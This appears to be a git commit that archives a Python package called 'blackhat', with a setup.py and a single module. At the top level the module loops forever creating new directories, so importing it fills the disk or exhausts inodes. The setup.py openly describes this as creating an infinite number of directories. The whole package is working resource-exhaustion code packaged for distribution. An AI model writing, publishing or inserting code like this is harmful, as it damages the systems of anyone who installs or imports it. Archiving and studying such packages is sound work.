f23d3932e9df5a6387e2c25225fdd7d77cce3068
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 12:21:33 +0000

    Add package blackhat/1.0.0/blackhat-1.0.0.tar.gz

---
+++ packages/blackhat/blackhat-1.0.0.tar.gz/blackhat-1.0.0/blackhat.py
@@ -0,0 +1,7 @@
+import os
+a = 1
+while True:
+	a = a + 1
+	b = str(a)
+	c = b + '1'
+	os.mkdir(c)
---
+++ packages/blackhat/blackhat-1.0.0.tar.gz/blackhat-1.0.0/setup.py
@@ -0,0 +1,10 @@
+from distutils.core import setup
+setup(
+	name = 'blackhat',
+	version = '1.0.0',
+	py_modules = ['blackhat'],
+	author = 'p0wn',
+	author_email = 'poojarysurya4@gmail.com',
+	url = '',
+	description = ' A python module to create infinite number of directories',
+)
